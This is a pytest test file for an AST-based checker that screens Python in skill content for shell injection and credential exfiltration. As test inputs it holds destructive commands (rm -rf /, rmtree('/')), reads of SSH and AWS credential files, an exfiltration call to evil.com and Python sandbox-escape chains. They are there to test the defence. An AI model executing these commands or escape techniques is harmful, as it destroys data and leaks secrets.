"""Tests for AST-based safety checker — replaces regex-only screening (Finding #2).

The AST checker parses Python code blocks from skill content, walks the AST to detect
dangerous operations (shell injection, credential exfiltration), and handles evasion
vectors that regex screening cannot catch (alias tracking, dynamic imports, attribute
chains).

8 test groups, 78 cases:
  1. Evasion vectors (15)  — attacks that bypass regex but AST catches
  2. Alias tracking (5)    — import-as, from-import-as, chained aliases
  3. Markdown extraction (7) — fenced code blocks, heredocs, edge cases
  4. False positive prevention (8) — safe code that must NOT be flagged
  5. Syntax errors (3)     — malformed Python handled gracefully
  6. Backward compat (4)   — AST flags use same names as existing regex flags
  7. Performance (2)        — large inputs don't hang or OOM
  8. Adversarial coverage (34) — S9 + W12.1 + W12.2 (Codex findings)
"""

from __future__ import annotations

import textwrap

import pytest

from openspace.skill_engine.ast_safety import (
    check_ast_safety,
    check_python_blocks_safety,
    extract_python_blocks,
)
from openspace.skill_engine.skill_utils import _BLOCKING_FLAGS, is_skill_safe


# ---------------------------------------------------------------------------
# Group 1 — Evasion vectors (15 cases)
# Attacks that regex screening misses but AST analysis catches.
# ---------------------------------------------------------------------------

class TestEvasionVectors:
    """Each case represents a real evasion technique that bypasses regex."""

    def test_eval_bare_call(self) -> None:
        flags = check_ast_safety("eval('print(1)')")
        assert "blocked.shell_injection" in flags

    def test_exec_bare_call(self) -> None:
        flags = check_ast_safety("exec('import os')")
        assert "blocked.shell_injection" in flags

    def test_eval_with_variable_arg(self) -> None:
        """eval() with non-constant arg — blanket block regardless of argument."""
        flags = check_ast_safety("x = 'os.system(\"rm -rf /\")'\neval(x)")
        assert "blocked.shell_injection" in flags

    def test_exec_multiline(self) -> None:
        src = textwrap.dedent("""\
            code = '''
            import subprocess
            subprocess.run(['ls'])
            '''
            exec(code)
        """)
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_dunder_import_subprocess(self) -> None:
        flags = check_ast_safety("__import__('subprocess').run(['ls'])")
        assert "blocked.shell_injection" in flags

    def test_dunder_import_dynamic(self) -> None:
        """__import__ with a non-constant argument — fail-closed."""
        flags = check_ast_safety("mod_name = 'sub' + 'process'\n__import__(mod_name)")
        assert "blocked.shell_injection" in flags

    def test_os_system_direct(self) -> None:
        flags = check_ast_safety("import os\nos.system('rm -rf /')")
        assert "blocked.shell_injection" in flags

    def test_os_popen_direct(self) -> None:
        flags = check_ast_safety("import os\nos.popen('ls')")
        assert "blocked.shell_injection" in flags

    def test_subprocess_popen(self) -> None:
        flags = check_ast_safety("import subprocess\nsubprocess.Popen(['ls'])")
        assert "blocked.shell_injection" in flags

    def test_subprocess_call(self) -> None:
        flags = check_ast_safety("import subprocess\nsubprocess.call(['ls'])")
        assert "blocked.shell_injection" in flags

    def test_subprocess_check_output(self) -> None:
        flags = check_ast_safety("import subprocess\nsubprocess.check_output(['ls'])")
        assert "blocked.shell_injection" in flags

    def test_getattr_on_os_dynamic(self) -> None:
        """getattr(os, dynamic_name) — fail-closed on dynamic attr for dangerous modules."""
        src = "import os\nfunc_name = 'system'\ngetattr(os, func_name)()"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_open_sensitive_path(self) -> None:
        """open() with constant arg pointing to sensitive file."""
        flags = check_ast_safety("f = open('/home/user/.ssh/id_rsa')")
        assert "blocked.credential_exfil" in flags

    def test_open_aws_credentials(self) -> None:
        flags = check_ast_safety("data = open('/home/user/.aws/credentials').read()")
        assert "blocked.credential_exfil" in flags

    def test_shutil_rmtree(self) -> None:
        flags = check_ast_safety("import shutil\nshutil.rmtree('/')")
        assert "blocked.shell_injection" in flags


# ---------------------------------------------------------------------------
# Group 2 — Alias tracking (5 cases)
# import X as Y, from X import Y as Z
# ---------------------------------------------------------------------------

class TestAliasTracking:
    """The AST walker must follow import aliases to detect evasion."""

    def test_import_os_as_alias(self) -> None:
        src = "import os as operating\noperating.system('ls')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_from_subprocess_import_as_alias(self) -> None:
        src = "from subprocess import run as execute\nexecute(['ls'])"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_from_os_import_system_as_alias(self) -> None:
        src = "from os import system as sys_cmd\nsys_cmd('ls')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_import_shutil_as_alias(self) -> None:
        src = "import shutil as sh\nsh.rmtree('/')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_from_ctypes_import(self) -> None:
        """ctypes is a dangerous exec module."""
        src = "import ctypes as ct\nct.cdll.LoadLibrary('/tmp/evil.so')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags


# ---------------------------------------------------------------------------
# Group 3 — Markdown extraction (7 cases)
# extract_python_blocks and check_python_blocks_safety on markdown input
# ---------------------------------------------------------------------------

class TestMarkdownExtraction:
    """Tests for extracting Python code blocks from markdown skill content."""

    def test_single_python_fenced_block(self) -> None:
        md = '```python\nprint("hello")\n```'
        blocks = extract_python_blocks(md)
        assert len(blocks) == 1
        assert 'print("hello")' in blocks[0]

    def test_py_shorthand_fence(self) -> None:
        md = '```py\nx = 1\n```'
        blocks = extract_python_blocks(md)
        assert len(blocks) == 1

    def test_multiple_python_blocks(self) -> None:
        md = '```python\na = 1\n```\n\nSome text\n\n```python\nb = 2\n```'
        blocks = extract_python_blocks(md)
        assert len(blocks) == 2

    def test_non_python_blocks_excluded(self) -> None:
        md = '```bash\necho hello\n```\n\n```python\nx = 1\n```\n\n```javascript\nlet x = 1\n```'
        blocks = extract_python_blocks(md)
        assert len(blocks) == 1
        assert "x = 1" in blocks[0]

    def test_empty_python_block(self) -> None:
        md = '```python\n\n```'
        blocks = extract_python_blocks(md)
        # Empty blocks are either empty strings or excluded
        assert len(blocks) <= 1

    def test_heredoc_python_in_bash(self) -> None:
        """Heredoc Python embedded in bash should be extracted."""
        md = textwrap.dedent("""\
            ```bash
            python3 <<'EOF'
            import subprocess
            subprocess.run(['ls'])
            EOF
            ```
        """)
        blocks = extract_python_blocks(md)
        # Should detect the heredoc Python
        assert len(blocks) >= 1

    def test_no_fenced_blocks_tries_full_parse(self) -> None:
        """Plain Python without fences — check_python_blocks_safety tries full parse."""
        src = "import os\nos.system('ls')"
        flags = check_python_blocks_safety(src)
        assert "blocked.shell_injection" in flags


# ---------------------------------------------------------------------------
# Group 4 — False positive prevention (8 cases)
# Safe code that must NOT trigger blocking flags.
# ---------------------------------------------------------------------------

class TestFalsePositivePrevention:
    """Safe, legitimate code that should pass the safety check."""

    def test_import_os_alone_is_safe(self) -> None:
        """Importing os without calling dangerous functions is allowed."""
        flags = check_ast_safety("import os\npath = os.path.join('a', 'b')")
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking, f"False positive: {blocking}"

    def test_os_path_operations_safe(self) -> None:
        src = "import os\nos.path.exists('/tmp')\nos.getcwd()\nos.listdir('.')"
        flags = check_ast_safety(src)
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking

    def test_open_regular_file_safe(self) -> None:
        """open() with non-sensitive path is allowed."""
        flags = check_ast_safety("f = open('data.txt', 'r')\ndata = f.read()")
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking

    def test_open_with_variable_arg_blocked(self) -> None:
        """S3: open() with non-constant arg — fail-closed (exfil via variable)."""
        flags = check_ast_safety("filename = get_path()\nf = open(filename)")
        assert "blocked.credential_exfil" in flags

    def test_print_and_math_safe(self) -> None:
        src = "import math\nprint(math.sqrt(16))\nresult = 2 ** 10"
        flags = check_ast_safety(src)
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking

    def test_json_and_pathlib_safe(self) -> None:
        src = "import json\nfrom pathlib import Path\ndata = json.loads('{}')\np = Path('.')"
        flags = check_ast_safety(src)
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking

    def test_class_definition_safe(self) -> None:
        src = textwrap.dedent("""\
            class MyProcessor:
                def __init__(self, name: str):
                    self.name = name
                def process(self, data: list) -> list:
                    return [x * 2 for x in data]
        """)
        flags = check_ast_safety(src)
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking

    def test_async_def_safe(self) -> None:
        src = textwrap.dedent("""\
            import asyncio
            async def fetch():
                await asyncio.sleep(1)
                return "done"
        """)
        flags = check_ast_safety(src)
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking


# ---------------------------------------------------------------------------
# Group 5 — Syntax errors (3 cases)
# Malformed Python is handled gracefully.
# ---------------------------------------------------------------------------

class TestSyntaxErrors:
    """AST parsing failures should not crash the checker."""

    def test_syntax_error_returns_empty_flags(self) -> None:
        """SyntaxError on ast.parse → skip silently, fall through to regex."""
        flags = check_ast_safety("def broken(\n    # missing closing paren")
        # SyntaxError: should return empty (fall through to regex in the orchestrator)
        assert isinstance(flags, list)

    def test_incomplete_expression(self) -> None:
        flags = check_ast_safety("x = (1 +")
        assert isinstance(flags, list)

    def test_mixed_valid_and_invalid_blocks(self) -> None:
        """Markdown with one valid dangerous block and one syntax error block."""
        md = textwrap.dedent("""\
            ```python
            eval("bad")
            ```

            ```python
            def broken(
            ```
        """)
        flags = check_python_blocks_safety(md)
        # The valid block should still be caught
        assert "blocked.shell_injection" in flags


# ---------------------------------------------------------------------------
# Group 6 — Backward compatibility (4 cases)
# AST flags reuse existing flag names from regex system.
# ---------------------------------------------------------------------------

class TestBackwardCompat:
    """AST checker uses the same flag names as the regex-based system."""

    def test_shell_injection_flag_name_matches_regex(self) -> None:
        """AST shell_injection flag matches the regex-defined blocking flag."""
        flags = check_ast_safety("import subprocess\nsubprocess.run(['ls'])")
        assert any(f == "blocked.shell_injection" for f in flags)
        assert "blocked.shell_injection" in _BLOCKING_FLAGS

    def test_credential_exfil_flag_name_matches_regex(self) -> None:
        flags = check_ast_safety("open('/root/.ssh/id_rsa')")
        assert any(f == "blocked.credential_exfil" for f in flags)
        assert "blocked.credential_exfil" in _BLOCKING_FLAGS

    def test_is_skill_safe_rejects_ast_flags(self) -> None:
        """is_skill_safe() from skill_utils rejects AST-produced blocking flags."""
        flags = check_ast_safety("eval('code')")
        assert not is_skill_safe(flags)

    def test_safe_code_passes_is_skill_safe(self) -> None:
        flags = check_ast_safety("x = 1 + 2")
        assert is_skill_safe(flags)


# ---------------------------------------------------------------------------
# Group 7 — Performance (2 cases)
# Large inputs don't cause hangs or excessive memory usage.
# ---------------------------------------------------------------------------

class TestPerformance:
    def test_large_safe_file_completes_quickly(self) -> None:
        """1000-line safe Python file should complete in < 2 seconds."""
        lines = ["x_{i} = {i}".format(i=i) for i in range(1000)]
        src = "\n".join(lines)
        flags = check_ast_safety(src)
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking

    def test_large_markdown_with_many_blocks(self) -> None:
        """50 Python blocks in markdown should complete without issue."""
        blocks = []
        for i in range(50):
            blocks.append(f"```python\ny_{i} = {i}\n```\n")
        md = "\n".join(blocks)
        flags = check_python_blocks_safety(md)
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking


# ---------------------------------------------------------------------------
# Group 8 — Adversarial coverage (13 cases) — S9
# Targeted tests for each W12 security fix to prevent regressions.
# ---------------------------------------------------------------------------

class TestAdversarialW12:
    """S9: Adversarial tests covering every W12 fix vector."""

    # --- S1: SyntaxError fail-closed for fenced blocks ---

    def test_polyglot_syntax_error_fail_closed(self) -> None:
        """Polyglot payload that fails Python parse — must be blocked (S1)."""
        # PHP/Python polyglot that SyntaxError's in Python
        src = "<?php system('whoami'); ?>\neval('import os')"
        flags = check_ast_safety(src, fail_closed=True)
        assert "blocked.unparseable_code" in flags

    def test_syntax_error_fail_open_speculative(self) -> None:
        """Speculative parse (fail_closed=False) should NOT block on SyntaxError."""
        src = "<?php echo 'hello'; ?>"
        flags = check_ast_safety(src, fail_closed=False)
        assert "blocked.unparseable_code" not in flags

    # --- S2: breakpoint(), sys.modules, types module ---

    def test_breakpoint_builtin_blocked(self) -> None:
        """breakpoint() drops into interactive debugger — must block (S2)."""
        flags = check_ast_safety("breakpoint()")
        assert "blocked.shell_injection" in flags

    def test_sys_modules_access_blocked(self) -> None:
        """sys.modules manipulation enables module hijacking (S2)."""
        flags = check_ast_safety("import sys\nsys.modules['os'] = fake_os")
        assert "blocked.shell_injection" in flags

    def test_sys_getframe_blocked(self) -> None:
        """sys._getframe() leaks caller stack frames (S2)."""
        flags = check_ast_safety("import sys\nframe = sys._getframe(0)")
        assert "blocked.shell_injection" in flags

    def test_types_module_import_blocked(self) -> None:
        """types module enables function construction from bytecode (S2)."""
        src = "import types\nf = types.FunctionType(code_obj, {})"
        flags = check_ast_safety(src)
        # types is in _DANGEROUS_META_MODULES → any call should be blocked
        assert "blocked.shell_injection" in flags

    # --- S3: open() with variable path ---

    def test_open_variable_path_fail_closed(self) -> None:
        """open() with computed path — credential exfil via variable (S3)."""
        src = "path = user_input + '/.ssh/id_rsa'\nf = open(path)"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    # --- S6: Heredoc with full /usr/bin/python3 path ---

    def test_heredoc_full_path_python(self) -> None:
        """Heredoc using /usr/bin/python3 should be extracted (S6)."""
        md = textwrap.dedent("""\
            ```bash
            /usr/bin/python3 <<'PYEOF'
            import subprocess
            subprocess.run(['id'])
            PYEOF
            ```
        """)
        flags = check_python_blocks_safety(md)
        assert "blocked.shell_injection" in flags

    def test_heredoc_python311_versioned(self) -> None:
        """Heredoc using python3.11 versioned path (S6)."""
        md = textwrap.dedent("""\
            ```bash
            /usr/local/bin/python3.11 <<'END'
            import os
            os.system('whoami')
            END
            ```
        """)
        flags = check_python_blocks_safety(md)
        assert "blocked.shell_injection" in flags

    # --- S7/S8: getattr on nested module attribute ---

    def test_getattr_nested_module_attribute(self) -> None:
        """getattr(some.module, dynamic_attr) — S8 extended resolution."""
        src = textwrap.dedent("""\
            import importlib
            attr = get_user_input()
            getattr(importlib, attr)()
        """)
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    # --- M3: os.environ subscript ---

    def test_os_environ_sensitive_key(self) -> None:
        """os.environ['API_KEY'] — sensitive constant key (M3)."""
        flags = check_ast_safety("import os\nkey = os.environ['API_SECRET_KEY']")
        assert "blocked.credential_exfil" in flags

    def test_os_environ_dynamic_key(self) -> None:
        """os.environ[variable] — non-constant key fail-closed (M3)."""
        flags = check_ast_safety("import os\nk = get_key()\nval = os.environ[k]")
        assert "blocked.credential_exfil" in flags

    def test_os_environ_safe_key_no_block(self) -> None:
        """os.environ['HOME'] — non-sensitive constant key should NOT block."""
        flags = check_ast_safety("import os\nhome = os.environ['HOME']")
        blocking = [f for f in flags if f in _BLOCKING_FLAGS]
        assert not blocking, f"False positive on safe environ key: {blocking}"

    # --- W12.1: os.getenv credential exfiltration ---

    def test_os_getenv_blocked_as_credential_exfil(self) -> None:
        """os.getenv('SECRET_KEY') — credential exfil, not shell injection."""
        flags = check_ast_safety("import os\nval = os.getenv('SECRET_KEY')")
        assert "blocked.credential_exfil" in flags

    # --- W12.1: os.environ.get/pop/setdefault ---

    def test_os_environ_get_method_blocked(self) -> None:
        """os.environ.get('PASSWORD') — credential exfiltration."""
        flags = check_ast_safety("import os\npw = os.environ.get('PASSWORD')")
        assert "blocked.credential_exfil" in flags

    def test_os_environ_pop_method_blocked(self) -> None:
        """os.environ.pop('API_KEY') — credential exfiltration."""
        flags = check_ast_safety("import os\nk = os.environ.pop('API_KEY')")
        assert "blocked.credential_exfil" in flags

    # --- W12.1: Dunder attribute sandbox escapes ---

    def test_dunder_subclasses_escape(self) -> None:
        """().__class__.__bases__[0].__subclasses__() — reach Popen via MRO."""
        src = "().__class__.__bases__[0].__subclasses__()"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_dunder_globals_escape(self) -> None:
        """f.__globals__['__builtins__'] — access module namespace."""
        src = "f = lambda: None\nb = f.__globals__['__builtins__']"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_dunder_code_access(self) -> None:
        """f.__code__ — bytecode manipulation."""
        src = "f = lambda: None\nc = f.__code__"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    # --- W12.1: Case-insensitive fence + python3/python2 aliases ---

    def test_uppercase_python_fence_extracted(self) -> None:
        """```Python (uppercase) should be extracted and checked."""
        md = '```Python\nimport subprocess\nsubprocess.run(["ls"])\n```'
        flags = check_python_blocks_safety(md)
        assert "blocked.shell_injection" in flags

    def test_python3_fence_extracted(self) -> None:
        """```python3 should be extracted and checked."""
        md = '```python3\nimport os\nos.system("id")\n```'
        flags = check_python_blocks_safety(md)
        assert "blocked.shell_injection" in flags

    # --- W12.1: Additional dangerous modules ---

    def test_webbrowser_open_exfil(self) -> None:
        """webbrowser.open() — data exfiltration via URL."""
        src = "import webbrowser\nwebbrowser.open('https://evil.com/?' + data)"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_globals_builtin_blocked(self) -> None:
        """globals() — enables __import__ via dict subscription."""
        flags = check_ast_safety("g = globals()\ng['__import__']('os')")
        assert "blocked.shell_injection" in flags

    def test_gc_module_blocked(self) -> None:
        """gc.get_objects() — enumerates live objects in memory."""
        src = "import gc\nobjs = gc.get_objects()"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    # --- W12.2: Codex-found bypass vectors ---

    def test_getattr_dunder_subclasses_any_object(self) -> None:
        """CRITICAL: getattr(object, '__subclasses__') must be blocked on ANY receiver."""
        flags = check_ast_safety('getattr(object, "__subclasses__")()')
        assert "blocked.shell_injection" in flags

    def test_getattr_dunder_globals_any_object(self) -> None:
        """CRITICAL: getattr(f, '__globals__') on arbitrary object."""
        src = "def f(): pass\ngetattr(f, '__globals__')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_getattr_os_getenv_bypass(self) -> None:
        """HIGH: getattr(os, 'getenv') must be caught as credential_exfil."""
        src = "import os\ngetattr(os, 'getenv')('API_KEY')"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_getattr_os_environ_bypass(self) -> None:
        """HIGH: getattr(os, 'environ') is gateway to credential access."""
        src = "import os\ngetattr(os, 'environ').get('API_KEY')"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_builtins_dict_import_bypass(self) -> None:
        """HIGH: builtins.__dict__['__import__'] must be blocked via __dict__ dunder."""
        src = 'import builtins\nmod = builtins.__dict__["__import__"]("subprocess")'
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_from_os_import_environ_get(self) -> None:
        """HIGH: from os import environ; environ.get('KEY') — alias resolution."""
        src = "from os import environ\npw = environ.get('PASSWORD')"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_from_os_import_environ_subscript(self) -> None:
        """HIGH: from os import environ; environ['SECRET_KEY'] — aliased subscript."""
        src = "from os import environ\nk = environ['SECRET_KEY']"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_from_os_import_environ_as_alias_subscript(self) -> None:
        """HIGH: from os import environ as e; e['API_KEY'] — double alias."""
        src = "from os import environ as e\nk = e['API_KEY']"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_from_os_import_environ_pop(self) -> None:
        """HIGH: from os import environ; environ.pop('TOKEN')."""
        src = "from os import environ\ntok = environ.pop('TOKEN')"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_getattr_dunder_dict_any_object(self) -> None:
        """HIGH: getattr(builtins, '__dict__') must be blocked."""
        src = "import builtins\nd = getattr(builtins, '__dict__')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    # --- W12.3: Codex-identified bypass fixes ---

    def test_builtins_subscript_import(self) -> None:
        """CRIT: __builtins__['__import__']('os') must be blocked."""
        src = "__builtins__['__import__']('os')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_builtins_subscript_eval(self) -> None:
        """CRIT: __builtins__['eval']('code') must be blocked."""
        src = "__builtins__['eval']('code')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_builtins_getattribute_import(self) -> None:
        """CRIT: builtins.__getattribute__('__import__')('os') must be blocked."""
        src = "import builtins\nbuiltins.__getattribute__('__import__')('os')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_builtins_getattribute_dict(self) -> None:
        """CRIT: builtins.__getattribute__('__dict__') must be blocked."""
        src = "import builtins\nbuiltins.__getattribute__('__dict__')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_object_getattribute_builtins(self) -> None:
        """CRIT: object.__getattribute__(builtins, '__dict__') via getattr."""
        src = "import builtins\nobject.__getattribute__(builtins, '__dict__')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_dict_os_environ(self) -> None:
        """HIGH: dict(os.environ) copies all env vars — credential exfil."""
        src = "import os\nall_env = dict(os.environ)"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_os_environ_copy(self) -> None:
        """HIGH: os.environ.copy() copies all env vars — credential exfil."""
        src = "import os\nall_env = os.environ.copy()"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_list_os_environ_items(self) -> None:
        """HIGH: list(os.environ.items()) — whole-env copy."""
        src = "import os\nall_items = list(os.environ.items())"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_os_environ_values(self) -> None:
        """HIGH: os.environ.values() — credential exfil."""
        src = "import os\nos.environ.values()"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_getattr_dunder_getattribute_any(self) -> None:
        """W12.3: getattr(x, '__getattribute__') must be blocked."""
        src = "getattr(obj, '__getattribute__')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_safe_getattr_no_false_positive(self) -> None:
        """LOW: Safe getattr(obj, 'name') must NOT be flagged."""
        src = "x = getattr(my_obj, 'some_attr')"
        flags = check_ast_safety(src)
        assert not any(f.startswith("blocked.") for f in flags)

    # --- W14: Codex-identified bypass fixes ---

    def test_builtins_get_import(self) -> None:
        """CRIT: __builtins__.get('__import__')('os') must be blocked."""
        src = "__builtins__.get('__import__')('os')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_builtins_pop_import(self) -> None:
        """CRIT: __builtins__.pop('__import__') must be blocked."""
        src = "__builtins__.pop('__import__')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_builtins_values(self) -> None:
        """CRIT: __builtins__.values() must be blocked."""
        src = "__builtins__.values()"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_dict_builtins_import(self) -> None:
        """CRIT: dict(__builtins__)['__import__']('os') must be blocked."""
        src = "dict(__builtins__)['__import__']('os')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_list_builtins(self) -> None:
        """CRIT: list(__builtins__) must be blocked."""
        src = "list(__builtins__)"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_getattr_builtins_get(self) -> None:
        """CRIT: getattr(__builtins__, 'get')('__import__')('sys') must be blocked."""
        src = "getattr(__builtins__, 'get')('__import__')('sys')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_getattr_sys_getframe(self) -> None:
        """CRIT: getattr(sys, '_getframe')(0) must be blocked."""
        src = "import sys\ngetattr(sys, '_getframe')(0)"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_getattr_sys_modules(self) -> None:
        """CRIT: getattr(sys, 'modules') must be blocked."""
        src = "import sys\ngetattr(sys, 'modules')"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_getattr_sys_dynamic(self) -> None:
        """CRIT: getattr(sys, dynamic_var) must be blocked (fail-closed)."""
        src = "import sys\ngetattr(sys, x)"
        flags = check_ast_safety(src)
        assert "blocked.shell_injection" in flags

    def test_getattr_os_environ_get(self) -> None:
        """HIGH: getattr(os.environ, 'get')('PASSWORD') must be blocked."""
        src = "import os\ngetattr(os.environ, 'get')('PASSWORD')"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_getattr_os_environ_items(self) -> None:
        """HIGH: getattr(os.environ, 'items')() must be blocked."""
        src = "import os\ngetattr(os.environ, 'items')()"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_getattr_os_environ_dynamic(self) -> None:
        """HIGH: getattr(os.environ, dynamic) must be blocked (fail-closed)."""
        src = "import os\ngetattr(os.environ, x)"
        flags = check_ast_safety(src)
        assert "blocked.credential_exfil" in flags

    def test_getattr_sys_safe_attr_no_flag(self) -> None:
        """Safe: getattr(sys, 'version') must NOT be blocked."""
        src = "import sys\ngetattr(sys, 'version')"
        flags = check_ast_safety(src)
        assert not any(f.startswith("blocked.") for f in flags)
